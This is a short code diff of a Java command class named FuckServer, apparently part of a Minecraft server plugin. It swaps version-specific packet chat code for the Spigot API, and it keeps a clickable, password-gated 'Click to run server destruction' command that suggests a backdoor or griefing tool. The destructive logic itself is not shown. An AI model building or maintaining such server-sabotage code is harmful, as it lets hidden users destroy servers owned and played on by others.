@@ -8,15 +8,10 @@ import net.md_5.bungee.api.chat.BaseComponent;
 import net.md_5.bungee.api.chat.ClickEvent;
 import net.md_5.bungee.api.chat.HoverEvent;
 import net.md_5.bungee.api.chat.TextComponent;
-import net.md_5.bungee.chat.ComponentSerializer;
-import net.minecraft.server.v1_14_R1.ChatMessageType;
-import net.minecraft.server.v1_14_R1.IChatBaseComponent;
-import net.minecraft.server.v1_14_R1.PacketPlayOutChat;
 import org.apache.commons.lang.RandomStringUtils;
 import org.bukkit.*;
 import org.bukkit.attribute.Attribute;
 import org.bukkit.craftbukkit.libs.org.apache.commons.io.FileUtils;
-import org.bukkit.craftbukkit.v1_14_R1.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.event.entity.EntityDamageEvent;
 import org.bukkit.event.player.PlayerLoginEvent;
@@ -67,14 +62,6 @@ public class FuckServer extends Command {
         return new Vector(rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min, rand.nextFloat() * (max - min) + min);
     }
 
-    private void JSONsendMessage(Player player, ChatMessageType position, BaseComponent... components) {
-        if (player == null) {
-            return;
-        }
-        IChatBaseComponent component = IChatBaseComponent.ChatSerializer.a(ComponentSerializer.toString(components));
-        PacketPlayOutChat packet = new PacketPlayOutChat(component, net.minecraft.server.v1_14_R1.ChatMessageType.a((byte) position.ordinal()));
-        ((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
-    }
 
     @Override
     public void onCommand(Player p, ArrayList<String> args) {
@@ -171,6 +158,6 @@ public class FuckServer extends Command {
         o.setBold(true);
         o.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, new BaseComponent[]{new TextComponent("Click to run server destruction")}));
         o.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, Start.COMMAND_SIGN + this.getCommand() + " " + password));
-        JSONsendMessage(p, ChatMessageType.CHAT, o);
+        p.spigot().sendMessage(o);
     }
 }
